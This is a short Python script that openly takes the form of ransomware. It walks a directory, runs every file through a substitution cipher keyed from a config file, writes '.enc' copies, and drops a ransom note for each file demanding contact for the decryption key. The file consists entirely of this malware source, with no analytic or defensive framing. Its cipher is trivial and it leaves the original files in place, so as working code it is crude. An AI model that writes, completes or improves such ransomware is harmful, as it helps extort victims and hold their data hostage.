import os
import logging
import configparser

def load_cipher_key(config_file):
    config = configparser.ConfigParser()
    config.read(config_file)
    return config['cipher']['key']

def encrypt_file(file_path, cipher_key):
    try:
        with open(file_path, 'r') as file:
            content = file.read()
        
        encrypted_content = ''.join(cipher_key[ord(char) - ord('a')] if 'a' <= char <= 'z' 
                                    else cipher_key[ord(char) - ord('A')] if 'A' <= char <= 'Z' 
                                    else char for char in content)
        
        encrypted_file_path = file_path + '.enc'
        with open(encrypted_file_path, 'w') as file:
            file.write(encrypted_content)
        
        return encrypted_file_path
    except Exception as e:
        logging.error(f"Failed to encrypt {file_path}: {e}")
        return None

def create_ransom_note(file_name, directory_path):
    note_path = os.path.join(directory_path, f"ransom_note_{os.path.basename(file_name)}.txt")
    with open(note_path, 'w') as note_file:
        note_file.write("Your files have been encrypted. Please contact us for the decryption key.\n")
    return note_path

def encrypt_directory(directory_path, config_file='config.ini'):
    cipher_key = load_cipher_key(config_file)
    
    # Set up logging
    logging.basicConfig(filename='encryption.log', level=logging.INFO,
                        format='%(asctime)s - %(levelname)s - %(message)s')
    
    for root, _, files in os.walk(directory_path):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            logging.info(f"Attempting to encrypt {file_path}")
            
            encrypted_file_path = encrypt_file(file_path, cipher_key)
            if encrypted_file_path:
                logging.info(f"Successfully encrypted {file_path} to {encrypted_file_path}")
                create_ransom_note(file_path, directory_path)
            else:
                logging.error(f"Encryption failed for {file_path}")

if __name__ == "__main__":
    encrypt_directory('/path/to/directory')